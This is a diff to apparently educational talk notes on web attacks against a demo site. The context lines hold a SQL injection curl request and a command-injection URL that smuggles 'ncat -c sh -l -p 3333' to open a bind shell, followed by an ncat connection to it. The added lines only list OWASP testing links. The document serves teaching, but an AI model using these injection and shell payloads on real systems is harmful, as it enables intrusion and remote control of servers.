@@ -159,3 +159,14 @@ curl "www.angry_monkey.com/profiles/42%5c/OR%09POLYGON((SELECT(1)FROM(SELECT(us3
 http://www.angry_monkey.com/index.php?doc=us.txt%26%26ncat -c sh -l -p 3333%26
 ncat www.angry_monkey.com 3333
 ```
+
+###Resources
+Our notes for the talk are in the Resources folder.  Below are links for the tools and organizations we speak about.
+
+* [OWASP] (https://www.owasp.org)
+* [OWASP Top 10] (https://www.owasp.org/index.php/Top_10_2013)
+* [OWASP Testing Guide] (https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)
+* [OWASP Testing for Reflected Cross site scripting] (https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
+* [OWASP Testing for SQL Injection] (https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005))
+* [OWASP Testing for MySQL] (https://www.owasp.org/index.php/Testing_for_MySQL)
+* [OWASP Testing for Command Injection] (https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013))
